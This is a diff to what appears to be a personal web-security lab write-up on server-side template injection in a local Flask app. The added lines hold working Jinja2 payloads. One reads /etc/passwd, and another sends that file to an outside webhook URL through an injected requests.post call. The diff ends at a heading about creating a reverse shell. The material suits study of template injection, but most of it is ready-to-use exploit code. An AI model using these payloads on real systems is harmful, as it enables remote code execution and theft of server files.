@@ -97,7 +97,18 @@ http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%
 ![image](https://github.com/poorvi1910/Web/assets/146640913/a516db8b-213f-4e58-8650-585cac3a95de)
 
 - ##  Send the contents of etc pass to  awebhook
+http://127.0.0.1:5000/?c={{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]('requests')['post']['__call__']
 
+To read file : ```request.__class__.__init__.__globals__.__builtins__.open.__call__("/etc/passwd").read()```
+
+Final result : ```<Response [200]>```
+
+PAYLOAD:
+```
+http://127.0.0.1:5000/?c={{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]('requests')['post']['__call__']('https://webhook-test.com/862d0fdb235354934d78409cb297c53c', data={'file': request.__class__.__init__.__globals__.__builtins__.open.__call__("/etc/passwd").read()}) }}
+```
+![image](https://github.com/poorvi1910/Web/assets/146640913/65bde4dc-928b-423c-9fc8-48ca1d5ecbe1)
 
 - ##  Create a reverse shell, save your work and run the command yes on the rev shell
+
 
